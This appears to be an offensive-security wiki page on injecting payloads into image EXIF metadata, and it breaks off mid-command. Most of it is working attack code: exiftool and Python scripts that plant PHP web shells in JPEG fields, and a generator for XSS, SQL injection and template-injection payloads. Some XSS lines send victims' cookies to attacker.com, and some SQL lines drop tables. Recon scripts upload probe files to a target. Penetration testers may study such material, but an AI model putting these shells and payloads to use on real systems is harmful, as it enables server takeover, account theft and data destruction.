---
title: EXIF Payload Injection
description: EXIF Payload Injection — Embed Executable Code in Image Metadata for RCE, XSS & Filter Bypass
navigation:
  icon: i-lucide-image-plus
  title: EXIF Payload Injection
---

## EXIF Payload Injection

::badge
**High to Critical Severity — CWE-434 / CWE-94 / CWE-79 / CWE-116**
::

::note
**EXIF (Exchangeable Image File Format)** is the metadata standard embedded in JPEG, TIFF, PNG, and WebP images. Every digital photograph contains EXIF data — camera model, GPS coordinates, timestamps, copyright notices, comments, and dozens of other fields. These fields are **free-text strings** that accept arbitrary content, including PHP code, JavaScript, SQL injection payloads, and shell commands. When a web application reads, displays, processes, or includes EXIF data without sanitization, an attacker can inject executable code into a **genuinely valid image file**. The image passes every content validation check — magic bytes, full image parsing, `getimagesize()`, re-encoding — because it IS a real image. The payload lives silently in metadata until the application triggers it.
::

EXIF injection is uniquely powerful because the payload is invisible to human viewers, survives many image processing pipelines, and exists inside a file that passes all content validation. The image opens normally in any image viewer, displays correctly as a thumbnail, and functions perfectly as an avatar or profile picture — while carrying a hidden weapon in its metadata.

---

## Vulnerability Anatomy

::accordion
  :::accordion-item{icon="i-lucide-cpu" label="How EXIF Payload Injection Works"}
  EXIF data is stored in the APP1 segment of JPEG files (and equivalent structures in other formats). It contains IFD (Image File Directory) entries, each with a tag ID, data type, and value. Many tags accept ASCII strings of arbitrary length.

  **Injection flow:**
  ```text
  CRAFT PHASE:
    Attacker creates valid JPEG image
    Injects PHP/JS/SQL into EXIF fields:
      - Comment: <?php system($_GET["cmd"]); ?>
      - ImageDescription: <script>alert(1)</script>
      - Artist: ' OR '1'='1' --
      - Copyright: {{7*7}} (SSTI)
         ↓
  UPLOAD PHASE:
    Image uploaded to web application
    Server validates:
      ✓ Extension: .jpg
      ✓ Content-Type: image/jpeg
      ✓ Magic bytes: FF D8 FF E0 (valid JPEG)
      ✓ getimagesize(): returns valid dimensions
      ✓ Full image parsing: valid JPEG structure
      ✓ Re-encoding: may or may not strip metadata
    Image stored successfully
         ↓
  TRIGGER PHASE (varies by vulnerability type):
    
    PHP RCE:
      Application includes the image via LFI
      PHP interpreter finds <?php ?> tags in EXIF data
      Code executes on the server
    
    Stored XSS:
      Application displays EXIF data on a web page
      <script> in Comment/Artist field renders as HTML
      JavaScript executes in victim's browser
    
    SQL Injection:
      Application inserts EXIF data into database
      SQL payload in Artist field breaks out of query
      Database command executes
    
    Command Injection:
      Application passes EXIF data to command-line tool
      Shell metacharacters in filename/comment execute
      OS commands run on the server
  ```
  :::

  :::accordion-item{icon="i-lucide-layers" label="Exploitable EXIF Fields"}
  Not all EXIF fields are equally useful for injection. The best fields are those that accept long ASCII strings and are commonly read/displayed by applications.

  | EXIF Field | Tag ID | Max Length | Commonly Displayed | Best For |
  | ---------- | ------ | ---------- | ------------------ | -------- |
  | **Comment** | 0x9286 / 0xFE | Unlimited | Yes — photo galleries | PHP, XSS, SQLi |
  | **ImageDescription** | 0x010E | Unlimited | Yes — image details | XSS, SQLi, SSTI |
  | **Artist** | 0x013B | Unlimited | Yes — photographer credit | XSS, SQLi |
  | **Copyright** | 0x8298 | Unlimited | Yes — rights info | XSS, SQLi |
  | **UserComment** | 0x9286 | Unlimited | Sometimes | PHP, XSS |
  | **DocumentName** | 0x010D | Unlimited | Rarely | PHP (hidden) |
  | **Make** | 0x010F | Short | Yes — camera info | XSS, SQLi |
  | **Model** | 0x0110 | Short | Yes — camera info | XSS, SQLi |
  | **Software** | 0x0131 | Medium | Sometimes | XSS |
  | **XPTitle** | 0x9C9B | Medium | Windows-specific | XSS |
  | **XPComment** | 0x9C9C | Medium | Windows-specific | XSS |
  | **XPAuthor** | 0x9C9D | Medium | Windows-specific | XSS |
  | **XPSubject** | 0x9C9E | Medium | Windows-specific | XSS |
  | **XPKeywords** | 0x9C9F | Medium | Windows-specific | XSS |
  | **GPSAreaInformation** | 0x001C | Medium | Rarely | Hidden payload |
  | **IPTC Caption** | — | Unlimited | Yes — news/stock photos | XSS, SQLi |
  | **XMP Description** | — | Unlimited | Sometimes | XSS, SSTI |
  :::

  :::accordion-item{icon="i-lucide-target" label="Attack Scenarios"}
  | Attack | Trigger Mechanism | Impact | Severity |
  | ------ | ----------------- | ------ | -------- |
  | **PHP RCE via LFI** | `include("/uploads/photo.jpg")` | Full server compromise | Critical |
  | **PHP RCE via .htaccess** | `.htaccess` enables PHP in `.jpg` + EXIF contains PHP | Server-side code execution | Critical |
  | **Stored XSS** | Application displays EXIF data in HTML without encoding | Cookie theft, account takeover | High |
  | **SQL Injection** | Application inserts EXIF data into SQL query | Database compromise | Critical |
  | **Command Injection** | Application passes EXIF to `exiftool`, `convert`, shell | OS command execution | Critical |
  | **SSTI** | Application renders EXIF data in template engine | Server-side template injection | High-Critical |
  | **Log Injection** | EXIF data written to logs, viewed in log viewer | XSS in admin panel, log poisoning | Medium |
  | **Header Injection** | EXIF data used in HTTP response headers | Response splitting, cache poisoning | Medium |
  | **LDAP Injection** | EXIF data used in LDAP queries | Authentication bypass | High |
  | **XML Injection** | EXIF data inserted into XML documents | XXE, data manipulation | High |
  | **CSV Injection** | EXIF data exported to CSV, opened in Excel | Formula execution | Medium |
  :::

  :::accordion-item{icon="i-lucide-shield-alert" label="Why EXIF Injection Bypasses Validation"}
  EXIF payload injection is devastating because the image file is **genuinely valid** at every level:

  1. **Extension check** → `.jpg` → PASS
  2. **Content-Type check** → `image/jpeg` → PASS
  3. **Magic bytes** → `FF D8 FF E0` → PASS (real JPEG header)
  4. **`getimagesize()`** → Returns valid width, height, type → PASS
  5. **`imagecreatefromjpeg()`** → Creates valid GD image resource → PASS
  6. **Full JPEG parsing** → Valid JFIF/EXIF structure → PASS
  7. **Image viewer** → Displays normally as a photo → PASS
  8. **Antivirus scan** → No executable code detected (it's in metadata) → PASS
  9. **WAF inspection** → Sees valid JPEG content → PASS

  The payload is hidden in metadata that most validation pipelines completely ignore. The only defense is **stripping all metadata** (re-encoding) or **sanitizing EXIF values** before use.
  :::
::

---

## Reconnaissance — Finding EXIF Injection Points

Before crafting payloads, identify **where the application reads EXIF data** and **how it uses it**. Different uses require different payloads.

### Identifying EXIF Processing

::tabs
  :::tabs-item{icon="i-lucide-search" label="Detect EXIF Data Display"}
  ```bash
  TARGET="https://target.com"
  COOKIE="session=TOKEN"

  echo "═══ EXIF Processing Detection ═══"

  # ── Step 1: Create image with distinctive EXIF markers ──
  # Use unique strings in each field to identify which ones are displayed

  python3 -c "
  from PIL import Image
  import piexif
  import struct

  # Create a valid 100x100 JPEG
  img = Image.new('RGB', (100, 100), color=(0, 128, 255))

  # Build EXIF data with unique markers per field
  exif_dict = {
      '0th': {
          piexif.ImageIFD.ImageDescription: b'EXIF_MARKER_DESC_12345',
          piexif.ImageIFD.Make: b'EXIF_MARKER_MAKE_12345',
          piexif.ImageIFD.Model: b'EXIF_MARKER_MODEL_12345',
          piexif.ImageIFD.Software: b'EXIF_MARKER_SOFTWARE_12345',
          piexif.ImageIFD.Artist: b'EXIF_MARKER_ARTIST_12345',
          piexif.ImageIFD.Copyright: b'EXIF_MARKER_COPYRIGHT_12345',
          piexif.ImageIFD.DocumentName: b'EXIF_MARKER_DOCNAME_12345',
      },
      'Exif': {
          piexif.ExifIFD.UserComment: b'ASCII\x00\x00\x00EXIF_MARKER_USERCOMMENT_12345',
      },
      '1st': {},
      'thumbnail': None,
      'GPS': {
          piexif.GPSIFD.GPSAreaInformation: b'EXIF_MARKER_GPSAREA_12345',
      },
  }

  exif_bytes = piexif.dump(exif_dict)
  img.save('exif_marker_test.jpg', 'JPEG', exif=exif_bytes, quality=95)
  print('[+] Created exif_marker_test.jpg with unique markers in all fields')
  " 2>/dev/null || {
      # Fallback: use exiftool
      python3 -c "from PIL import Image; Image.new('RGB',(100,100),'blue').save('base_marker.jpg','JPEG',quality=95)"
      exiftool \
        -Comment='EXIF_MARKER_COMMENT_12345' \
        -ImageDescription='EXIF_MARKER_DESC_12345' \
        -Artist='EXIF_MARKER_ARTIST_12345' \
        -Copyright='EXIF_MARKER_COPYRIGHT_12345' \
        -Make='EXIF_MARKER_MAKE_12345' \
        -Model='EXIF_MARKER_MODEL_12345' \
        -Software='EXIF_MARKER_SOFTWARE_12345' \
        -UserComment='EXIF_MARKER_USERCOMMENT_12345' \
        -DocumentName='EXIF_MARKER_DOCNAME_12345' \
        -XPTitle='EXIF_MARKER_XPTITLE_12345' \
        -XPComment='EXIF_MARKER_XPCOMMENT_12345' \
        -XPAuthor='EXIF_MARKER_XPAUTHOR_12345' \
        -overwrite_original \
        base_marker.jpg
      mv base_marker.jpg exif_marker_test.jpg
      echo '[+] Created exif_marker_test.jpg via exiftool'
  }

  # ── Step 2: Upload the marker image ──
  RESP=$(curl -s -X POST "${TARGET}/api/upload" \
    -F "file=@exif_marker_test.jpg;filename=test_photo.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE")

  echo "[*] Upload response: $(echo "$RESP" | head -1)"

  # ── Step 3: Check where markers appear ──
  echo ""
  echo "─── Searching for EXIF markers in application pages ───"

  # Check the uploaded image's detail page
  PAGES=(
      "${TARGET}/uploads/test_photo.jpg"
      "${TARGET}/photos/test_photo.jpg"
      "${TARGET}/api/photo/details"
      "${TARGET}/gallery"
      "${TARGET}/media"
      "${TARGET}/profile"
      "${TARGET}/user/photos"
      "${TARGET}/admin/media"
  )

  for page in "${PAGES[@]}"; do
      BODY=$(curl -s "$page" -H "Cookie: $COOKIE" 2>/dev/null)
      if echo "$BODY" | grep -q "EXIF_MARKER"; then
          echo ""
          echo "[+] EXIF data displayed at: $page"
          echo "    Fields found:"
          echo "$BODY" | grep -oE "EXIF_MARKER_[A-Z]+_12345" | sort -u | \
              sed 's/EXIF_MARKER_//; s/_12345//' | sed 's/^/      → /'
      fi
  done

  # ── Step 4: Check API responses for EXIF data ──
  echo ""
  echo "─── Checking API responses ───"

  # Common API patterns that return EXIF
  for api in \
      "${TARGET}/api/photos" \
      "${TARGET}/api/images" \
      "${TARGET}/api/media" \
      "${TARGET}/api/v1/files" \
      "${TARGET}/api/photo/metadata"; do
      BODY=$(curl -s "$api" -H "Cookie: $COOKIE" 2>/dev/null)
      if echo "$BODY" | grep -q "EXIF_MARKER"; then
          echo "[+] EXIF in API response: $api"
          echo "$BODY" | grep -oE "EXIF_MARKER_[A-Z]+_12345" | sort -u | \
              sed 's/EXIF_MARKER_//; s/_12345//' | sed 's/^/      → /'
      fi
  done

  rm -f exif_marker_test.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Detect EXIF Processing in Source Code"}
  ```bash
  # ── Search application source code for EXIF handling ──
  # Use this when you have access to source (gray-box testing)

  echo "═══ Source Code EXIF Processing Detection ═══"

  # PHP patterns
  echo "─── PHP EXIF functions ───"
  grep -rn "exif_read_data\|exif_imagetype\|getimagesize\|iptcparse\|exif_thumbnail" \
    --include="*.php" . 2>/dev/null | head -20

  # PHP displaying EXIF
  grep -rn "exif\[.*\]\|metadata\[.*\]\|iptc\[.*\]" --include="*.php" . 2>/dev/null | \
    grep -iE "echo|print|display|show|output|response" | head -20

  # Python PIL/Pillow EXIF
  grep -rn "getexif\|exif_data\|image\.info\|ExifTags\|piexif\|exifread" \
    --include="*.py" . 2>/dev/null | head -20

  # Node.js EXIF libraries
  grep -rn "exif-parser\|exif-reader\|exifr\|piexifjs\|exiftool\|sharp.*metadata" \
    --include="*.js" --include="*.ts" . 2>/dev/null | head -20

  # Java EXIF
  grep -rn "TiffField\|ExifDirectory\|metadata-extractor\|ImageMetadataReader\|ExifTool" \
    --include="*.java" . 2>/dev/null | head -20

  # Ruby EXIF
  grep -rn "exifr\|mini_exiftool\|exif\|EXIF" --include="*.rb" . 2>/dev/null | head -20

  # .NET EXIF
  grep -rn "PropertyItem\|ExifLib\|MetadataExtractor\|GetPropertyItem\|PropertyTagImageDescription" \
    --include="*.cs" . 2>/dev/null | head -20

  # Generic: EXIF data inserted into SQL
  grep -rn "INSERT.*exif\|INSERT.*metadata\|INSERT.*comment\|INSERT.*artist\|INSERT.*copyright" \
    --include="*.php" --include="*.py" --include="*.js" --include="*.java" . 2>/dev/null | head -20

  # Generic: EXIF data in command execution
  grep -rn "exec.*exif\|system.*metadata\|popen.*comment\|shell_exec.*image" \
    --include="*.php" --include="*.py" . 2>/dev/null | head -20

  # Generic: EXIF data passed to exiftool CLI
  grep -rn "exiftool\|identify\|convert.*-verbose\|jhead\|exiv2" \
    --include="*.php" --include="*.py" --include="*.js" --include="*.sh" . 2>/dev/null | head -20
  ```
  :::

  :::tabs-item{icon="i-lucide-search" label="Detect EXIF Stripping Behavior"}
  ```bash
  # ── Determine if the application strips EXIF data on upload ──
  # This tells you if EXIF injection is viable

  TARGET="https://target.com"
  COOKIE="session=TOKEN"
  UPLOAD_URL="${TARGET}/api/upload"
  FIELD="file"

  # Create image with known EXIF data
  python3 -c "
  from PIL import Image
  img = Image.new('RGB', (100, 100), 'red')
  img.save('/tmp/exif_strip_test.jpg', 'JPEG', quality=95)
  " 2>/dev/null

  exiftool \
    -Comment='EXIF_STRIP_TEST_COMMENT' \
    -Artist='EXIF_STRIP_TEST_ARTIST' \
    -Copyright='EXIF_STRIP_TEST_COPYRIGHT' \
    -ImageDescription='EXIF_STRIP_TEST_DESC' \
    -overwrite_original \
    /tmp/exif_strip_test.jpg

  echo "[*] Original EXIF:"
  exiftool /tmp/exif_strip_test.jpg | grep "EXIF_STRIP_TEST"

  # Upload
  RESP=$(curl -s -X POST "$UPLOAD_URL" \
    -F "${FIELD}=@/tmp/exif_strip_test.jpg;filename=strip_test.jpg;type=image/jpeg" \
    -H "Cookie: $COOKIE")

  # Download the stored file
  FILE_URL=$(echo "$RESP" | grep -oP '"(url|path)"\s*:\s*"([^"]*)"' | \
             grep -oP '"[^"]*"$' | tr -d '"' | head -1)

  if [ -n "$FILE_URL" ]; then
      curl -s "$FILE_URL" -o /tmp/exif_downloaded.jpg 2>/dev/null

      echo ""
      echo "[*] Downloaded EXIF:"
      PRESERVED=$(exiftool /tmp/exif_downloaded.jpg 2>/dev/null | grep -c "EXIF_STRIP_TEST")

      if [ "$PRESERVED" -gt 0 ]; then
          exiftool /tmp/exif_downloaded.jpg | grep "EXIF_STRIP_TEST"
          echo ""
          echo "[+] EXIF data PRESERVED — injection is viable!"
          echo "    ${PRESERVED} fields survived upload processing"
      else
          echo "[-] EXIF data STRIPPED — server re-encodes images"
          echo "    Try: ICC profile injection, IDAT chunk injection, or XMP metadata"
          echo "    Some processors preserve specific fields (test individually)"
      fi
  else
      echo "[*] Could not determine upload URL — check manually"
  fi

  rm -f /tmp/exif_strip_test.jpg /tmp/exif_downloaded.jpg
  ```
  :::
::

---

## Payload Crafting

### PHP Code in EXIF (for RCE via LFI)

When the application includes uploaded images via `include()`, `require()`, or similar PHP functions, PHP code in EXIF data executes on the server. This is the highest-impact EXIF injection attack.

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="ExifTool Injection — Complete"}
  ```bash
  # ═══════════════════════════════════════════════
  # Inject PHP shells into ALL EXIF fields
  # Multiple fields for redundancy — if one is stripped, others survive
  # ═══════════════════════════════════════════════

  # ── Step 1: Create a valid base image ──
  python3 -c "
  from PIL import Image
  # Create a real photo-like image (not just solid color)
  img = Image.new('RGB', (200, 200))
  pixels = img.load()
  for x in range(200):
      for y in range(200):
          pixels[x,y] = ((x*7)%256, (y*13)%256, ((x+y)*3)%256)
  img.save('base.jpg', 'JPEG', quality=95)
  " 2>/dev/null || convert -size 200x200 plasma:blue-red base.jpg 2>/dev/null || \
    printf '\xFF\xD8\xFF\xE0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00\xFF\xD9' > base.jpg

  # ── Step 2: Inject PHP into every available EXIF field ──
  exiftool \
    -Comment='<?php system($_GET["cmd"]); ?>' \
    -ImageDescription='<?php eval($_POST["e"]); ?>' \
    -Artist='<?=`$_GET[c]`?>' \
    -Copyright='<?php passthru($_GET["cmd"]); ?>' \
    -UserComment='<?php echo shell_exec($_REQUEST["cmd"]); ?>' \
    -DocumentName='<?php phpinfo(); ?>' \
    -Make='<?php readfile($_GET["f"]); ?>' \
    -Model='<?php file_put_contents("s.php",base64_decode($_POST["d"])); ?>' \
    -Software='<?php highlight_file($_GET["f"]); ?>' \
    -XPTitle='<?php system($_GET["cmd"]); ?>' \
    -XPComment='<?php eval($_POST["e"]); ?>' \
    -XPAuthor='<?php passthru($_GET["cmd"]); ?>' \
    -XPSubject='<?=`$_GET[c]`?>' \
    -XPKeywords='<?php echo shell_exec($_GET["cmd"]); ?>' \
    -overwrite_original \
    base.jpg

  # ── Step 3: Verify the image is still valid ──
  file base.jpg
  python3 -c "from PIL import Image; img=Image.open('base.jpg'); img.verify(); print(f'Valid JPEG: {img.size}')" 2>/dev/null

  # ── Step 4: Verify PHP code is embedded ──
  strings base.jpg | grep "<?php" | wc -l | xargs -I{} echo "[+] {} PHP payloads embedded"
  exiftool base.jpg | grep -iE "comment|description|artist|copyright|make|model|software"

  # ── Step 5: Create copies with different extensions ──
  cp base.jpg exif_shell.php.jpg      # For LFI + double extension
  cp base.jpg exif_shell.jpg          # For .htaccess + LFI chain
  cp base.jpg exif_shell.phtml        # For extension bypass
  cp base.jpg exif_shell.php5         # For alternative extension

  echo ""
  echo "[+] Files created:"
  ls -la exif_shell.* base.jpg
  echo ""
  echo "[*] Usage scenarios:"
  echo "    LFI: include('/uploads/exif_shell.jpg')  → PHP in EXIF executes"
  echo "    .htaccess: AddType application/x-httpd-php .jpg → access shell.jpg?cmd=id"
  echo "    Direct: Upload as .phtml → access directly with ?cmd=id"
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Python piexif Injection"}
  ```python [exif_php_injection.py]
  #!/usr/bin/env python3
  """
  Inject PHP/JS/SQL payloads into EXIF fields using piexif.
  Creates genuinely valid JPEG images with payloads hidden in metadata.
  """
  import piexif
  from PIL import Image
  import os
  import struct

  class ExifInjector:
      """Inject arbitrary payloads into EXIF metadata"""

      PHP_SHELLS = {
          'system':   b'<?php system($_GET["cmd"]); ?>',
          'eval':     b'<?php eval($_POST["e"]); ?>',
          'exec':     b'<?php echo "<pre>".shell_exec($_REQUEST["cmd"])."</pre>"; ?>',
          'minimal':  b'<?=`$_GET[c]`?>',
          'passthru': b'<?php passthru($_GET["cmd"]); ?>',
          'base64':   b'<?php eval(base64_decode($_POST["e"])); ?>',
          'file_read':b'<?php echo file_get_contents($_GET["f"]); ?>',
          'phpinfo':  b'<?php phpinfo(); ?>',
          'assert':   b'<?php @assert($_REQUEST["cmd"]); ?>',
          'preg':     b'<?php preg_replace("/.*/e",$_POST["e"],""); ?>',
      }

      XSS_PAYLOADS = {
          'alert':    b'<script>alert(document.domain)</script>',
          'steal':    b'<script>fetch("https://attacker.com/xss?c="+document.cookie)</script>',
          'img':      b'"><img src=x onerror=alert(document.domain)>',
          'svg':      b'"><svg onload=alert(document.domain)>',
          'event':    b'" autofocus onfocus="alert(document.domain)',
      }

      SQLI_PAYLOADS = {
          'union':    b"' UNION SELECT username,password FROM users--",
          'boolean':  b"' OR '1'='1' --",
          'error':    b"' AND extractvalue(1,concat(0x7e,version()))--",
          'time':     b"' AND SLEEP(5)--",
          'stacked':  b"'; DROP TABLE users;--",
      }

      SSTI_PAYLOADS = {
          'jinja2':   b'{{config.__class__.__init__.__globals__["os"].popen("id").read()}}',
          'twig':     b'{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}',
          'freemarker': b'<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
          'detect':   b'{{7*7}}${7*7}<%= 7*7 %>#{7*7}',
      }

      def __init__(self, width=200, height=200):
          self.width = width
          self.height = height

      def _create_base_image(self):
          """Create a valid, visually realistic base JPEG"""
          img = Image.new('RGB', (self.width, self.height))
          pixels = img.load()
          for x in range(self.width):
              for y in range(self.height):
                  pixels[x, y] = ((x * 7 + 50) % 256, (y * 13 + 100) % 256, ((x + y) * 3 + 75) % 256)
          return img

      def inject(self, output_path, payloads_dict, payload_key='system'):
          """Inject a specific payload into all EXIF fields"""
          img = self._create_base_image()

          payload = payloads_dict.get(payload_key, payloads_dict[list(payloads_dict.keys())[0]])

          exif_dict = {
              '0th': {
                  piexif.ImageIFD.ImageDescription: payload,
                  piexif.ImageIFD.Make: payload,
                  piexif.ImageIFD.Model: payload,
                  piexif.ImageIFD.Software: payload,
                  piexif.ImageIFD.Artist: payload,
                  piexif.ImageIFD.Copyright: payload,
                  piexif.ImageIFD.DocumentName: payload,
              },
              'Exif': {
                  piexif.ExifIFD.UserComment: b'ASCII\x00\x00\x00' + payload,
              },
              '1st': {},
              'thumbnail': None,
              'GPS': {
                  piexif.GPSIFD.GPSAreaInformation: payload,
              },
          }

          exif_bytes = piexif.dump(exif_dict)
          img.save(output_path, 'JPEG', exif=exif_bytes, quality=95)

          # Verify
          img_verify = Image.open(output_path)
          img_verify.verify()

          print(f"[+] {output_path:40s} — {payload_key} payload ({os.path.getsize(output_path):,} bytes)")
          return output_path

      def inject_all_php(self, output_dir='exif_php_payloads'):
          """Generate images with every PHP shell variant"""
          os.makedirs(output_dir, exist_ok=True)
          for name, _ in self.PHP_SHELLS.items():
              self.inject(os.path.join(output_dir, f'exif_php_{name}.jpg'), self.PHP_SHELLS, name)

      def inject_all_xss(self, output_dir='exif_xss_payloads'):
          """Generate images with every XSS variant"""
          os.makedirs(output_dir, exist_ok=True)
          for name, _ in self.XSS_PAYLOADS.items():
              self.inject(os.path.join(output_dir, f'exif_xss_{name}.jpg'), self.XSS_PAYLOADS, name)

      def inject_all_sqli(self, output_dir='exif_sqli_payloads'):
          """Generate images with every SQLi variant"""
          os.makedirs(output_dir, exist_ok=True)
          for name, _ in self.SQLI_PAYLOADS.items():
              self.inject(os.path.join(output_dir, f'exif_sqli_{name}.jpg'), self.SQLI_PAYLOADS, name)

      def inject_all_ssti(self, output_dir='exif_ssti_payloads'):
          """Generate images with every SSTI variant"""
          os.makedirs(output_dir, exist_ok=True)
          for name, _ in self.SSTI_PAYLOADS.items():
              self.inject(os.path.join(output_dir, f'exif_ssti_{name}.jpg'), self.SSTI_PAYLOADS, name)

      def inject_multi_payload(self, output_path):
          """Inject DIFFERENT payload types into different fields (maximum coverage)"""
          img = self._create_base_image()

          exif_dict = {
              '0th': {
                  piexif.ImageIFD.ImageDescription: self.XSS_PAYLOADS['alert'],
                  piexif.ImageIFD.Artist: self.SQLI_PAYLOADS['boolean'],
                  piexif.ImageIFD.Copyright: self.PHP_SHELLS['system'],
                  piexif.ImageIFD.Make: self.SSTI_PAYLOADS['detect'],
                  piexif.ImageIFD.Model: self.PHP_SHELLS['eval'],
                  piexif.ImageIFD.Software: self.XSS_PAYLOADS['steal'],
                  piexif.ImageIFD.DocumentName: self.PHP_SHELLS['minimal'],
              },
              'Exif': {
                  piexif.ExifIFD.UserComment: b'ASCII\x00\x00\x00' + self.PHP_SHELLS['exec'],
              },
              '1st': {},
              'thumbnail': None,
              'GPS': {},
          }

          exif_bytes = piexif.dump(exif_dict)
          img.save(output_path, 'JPEG', exif=exif_bytes, quality=95)

          Image.open(output_path).verify()
          print(f"[+] {output_path} — Multi-payload (PHP+XSS+SQLi+SSTI)")


  if __name__ == "__main__":
      injector = ExifInjector()

      print("═══ EXIF Payload Injection Generator ═══\n")

      injector.inject_all_php()
      injector.inject_all_xss()
      injector.inject_all_sqli()
      injector.inject_all_ssti()
      injector.inject_multi_payload('exif_multi_payload.jpg')

      print(f"\n[+] All payload images generated")
  ```
  :::

  :::tabs-item{icon="i-lucide-terminal" label="Quick CLI One-Liners"}
  ```bash
  # ═══════════════════════════════════════════════
  # Fast EXIF injection one-liners
  # ═══════════════════════════════════════════════

  # ── Create base image + inject in one command ──
  # PHP system shell
  convert -size 100x100 xc:red /tmp/exif.jpg 2>/dev/null || \
    python3 -c "from PIL import Image; Image.new('RGB',(100,100),'red').save('/tmp/exif.jpg')"
  exiftool -Comment='<?php system($_GET["cmd"]); ?>' -overwrite_original /tmp/exif.jpg

  # PHP eval shell
  exiftool -Artist='<?php eval($_POST["e"]); ?>' -overwrite_original /tmp/exif.jpg

  # XSS payload
  exiftool -Comment='<script>alert(document.domain)</script>' -overwrite_original /tmp/exif.jpg

  # SQL injection
  exiftool -Artist="' OR '1'='1' --" -overwrite_original /tmp/exif.jpg

  # SSTI detection
  exiftool -Copyright='{{7*7}}${7*7}<%= 7*7 %>' -overwrite_original /tmp/exif.jpg

  # Command injection
  exiftool -Model='$(id)' -overwrite_original /tmp/exif.jpg
  exiftool -Make='`id`' -overwrite_original /tmp/exif.jpg
  exiftool -Software='| id' -overwrite_original /tmp/exif.jpg

  # ── jhead tool (alternative, smaller) ──
  jhead -cl '<?php system($_GET["cmd"]); ?>' /tmp/exif.jpg 2>/dev/null

  # ── wrjpgcom tool (writes JPEG comment) ──
  echo '<?php system($_GET["cmd"]); ?>' | wrjpgcom /tmp/exif.jpg > /tmp/exif_wrjpg.jpg 2>/dev/null

  # ── Python one-liner (no external tools needed) ──
  python3 -c "
  import struct
  from PIL import Image
  import io

  img = Image.new('RGB', (100, 100), 'blue')
  buf = io.BytesIO()
  img.save(buf, 'JPEG', quality=95)
  jpg = buf.getvalue()

  # Insert COM segment with PHP
  php = b'<?php system(\$_GET[\"cmd\"]); ?>'
  com = b'\xff\xfe' + struct.pack('>H', len(php)+2) + php
  result = jpg[:2] + com + jpg[2:]

  with open('exif_python.jpg', 'wb') as f:
      f.write(result)
  print('[+] exif_python.jpg created')
  "

  # ── Verify all payloads are embedded ──
  echo ""
  echo "[*] Verification:"
  exiftool /tmp/exif.jpg | grep -iE "comment|artist|copyright|model|make|software|description" | head -10
  strings /tmp/exif.jpg | grep "<?php" | head -5
  ```
  :::
::

### XSS Payloads in EXIF (Stored XSS)

When the application displays EXIF metadata on web pages (photo galleries, image details, admin panels), XSS payloads in EXIF fields execute in the viewer's browser.

::tabs
  :::tabs-item{icon="i-lucide-code" label="Targeted XSS Payloads"}
  ```bash
  # ═══════════════════════════════════════════════
  # EXIF XSS payloads for different contexts
  # ═══════════════════════════════════════════════

  # Create base image
  python3 -c "from PIL import Image; Image.new('RGB',(100,100),'green').save('xss_base.jpg','JPEG',quality=95)" 2>/dev/null

  # ── Context 1: Displayed in HTML text ──
  # <p>Photo by: [Artist]</p>
  exiftool -Artist='<script>alert("XSS via EXIF Artist: "+document.domain)</script>' \
    -overwrite_original xss_base.jpg
  cp xss_base.jpg exif_xss_html_context.jpg

  # ── Context 2: Displayed in HTML attribute ──
  # <img alt="[Description]" src="photo.jpg">
  exiftool -ImageDescription='" onload="alert(document.domain)" x="' \
    -overwrite_original xss_base.jpg
  cp xss_base.jpg exif_xss_attr_context.jpg

  # ── Context 3: Displayed in title attribute ──
  # <div title="[Comment]">
  exiftool -Comment='" onfocus="alert(document.domain)" autofocus tabindex="1" x="' \
    -overwrite_original xss_base.jpg
  cp xss_base.jpg exif_xss_title_context.jpg

  # ── Context 4: Inside JavaScript string ──
  # var photographer = "[Artist]";
  exiftool -Artist="';alert(document.domain);//" \
    -overwrite_original xss_base.jpg
  cp xss_base.jpg exif_xss_js_context.jpg

  # ── Context 5: Inside JSON response ──
  # {"artist": "[Artist]"}
  exiftool -Artist='","evil":"<img src=x onerror=alert(document.domain)>","x":"' \
    -overwrite_original xss_base.jpg
  cp xss_base.jpg exif_xss_json_context.jpg

  # ── Context 6: Cookie stealer ──
  exiftool -Comment='<script>new Image().src="https://attacker.com/steal?c="+document.cookie</script>' \
    -overwrite_original xss_base.jpg
  cp xss_base.jpg exif_xss_stealer.jpg

  # ── Context 7: SVG onload in description ──
  exiftool -ImageDescription='<svg onload="alert(document.domain)">' \
    -overwrite_original xss_base.jpg
  cp xss_base.jpg exif_xss_svg.jpg

  # ── Context 8: IMG onerror ──
  exiftool -Copyright='<img src=x onerror="fetch(`https://attacker.com/x?${document.cookie}`)">' \
    -overwrite_original xss_base.jpg
  cp xss_base.jpg exif_xss_img.jpg

  # ── Context 9: Multiple fields (shotgun approach) ──
  exiftool \
    -Comment='<script>alert("Comment:"+document.domain)</script>' \
    -ImageDescription='<script>alert("Desc:"+document.domain)</script>' \
    -Artist='<script>alert("Artist:"+document.domain)</script>' \
    -Copyright='<script>alert("Copyright:"+document.domain)</script>' \
    -Make='<script>alert("Make:"+document.domain)</script>' \
    -Model='<script>alert("Model:"+document.domain)</script>' \
    -Software='<script>alert("Software:"+document.domain)</script>' \
    -UserComment='<script>alert("UserComment:"+document.domain)</script>' \
    -XPTitle='<script>alert("XPTitle:"+document.domain)</script>' \
    -XPComment='<script>alert("XPComment:"+document.domain)</script>' \
    -XPAuthor='<script>alert("XPAuthor:"+document.domain)</script>' \
    -overwrite_original xss_base.jpg
  cp xss_base.jpg exif_xss_all_fields.jpg

  echo "[+] XSS EXIF images created:"
  ls -la exif_xss_*.jpg

  rm -f xss_base.jpg
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="SQL Injection & Command Injection"}
  ```bash
  # ═══════════════════════════════════════════════
  # EXIF SQL Injection Payloads
  # For apps that INSERT EXIF data into databases
  # ═══════════════════════════════════════════════

  python3 -c "from PIL import Image; Image.new('RGB',(100,100),'yellow').save('sqli_base.jpg','JPEG',quality=95)" 2>/dev/null

  # SQL injection in different EXIF fields
  exiftool \
    -Artist="' OR '1'='1' --" \
    -Comment="' UNION SELECT username,password FROM users--" \
    -Copyright="'; DROP TABLE uploads;--" \
    -ImageDescription="' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--" \
    -Make="' AND SLEEP(5)--" \
